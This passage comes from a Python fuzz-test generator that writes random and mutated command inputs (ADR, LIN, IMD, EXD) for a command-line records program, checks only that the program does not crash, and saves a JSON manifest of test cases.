    for i in range(100):
        rid  = f"rnd{i:04d}"
        name = rand_payload().replace(" ","_")[:40]
        addr = rand_payload().replace(" ","_")[:40]
        ph   = rand_payload().replace(" ","_")[:20]
        emit(f"ADR {rid} name={name} address={addr} phone={ph}",
             [no_crash()], "random_adr", f"random ADR #{i}")

    # Random login attempts
    for _ in range(80):
        user = rand_str(1, 20).replace(" ","_")
        pw   = rand_str(1, 30).replace(" ","_")
        emit(f"LIN {user} {pw}",
             [no_crash()], "random_login", "random LIN")

    # Random file paths for IMD/EXD
    for _ in range(50):
        path = rand_str(1, 60).replace(" ", "_")
        emit(f"IMD {path}", [no_crash()], "random_imd", "random IMD path")
        emit(f"EXD {path}", [no_crash()], "random_exd", "random EXD path")

    # Mutation of valid commands (flip one char)
    for _ in range(50):
        cmd = random.choice(VALID_CMDS)
        mutated = list(cmd)
        idx = random.randint(0, len(cmd)-1)
        mutated[idx] = random.choice(string.ascii_letters)
        emit("".join(mutated), [no_crash()], "random_mutate", f"mutated cmd: {''.join(mutated)}")


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 11 — TEARDOWN
# ═════════════════════════════════════════════════════════════════════════════

def teardown():
    # Ensure clean logout and final EXT
    emit("LOU", [no_crash()], "teardown", "final logout (may already be logged out)")
    emit("EXT", [no_crash()], "teardown", "exit")


# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    setup()
    cat_unauth()
    cat_auth()
    cat_password()
    cat_records()
    cat_injection()
    cat_file_ops()
    cat_admin()
    cat_role_sep()
    cat_cli()
    cat_random()
    teardown()

    # Write manifest
    with open(MANIFEST_FILE, "w", encoding="utf-8") as fout:
        for entry in manifest:
            fout.write(json.dumps(entry, ensure_ascii=False) + "\n")

    print(f"# FUZZ_GEN_DONE: {seq} test cases written to manifest", file=sys.stderr)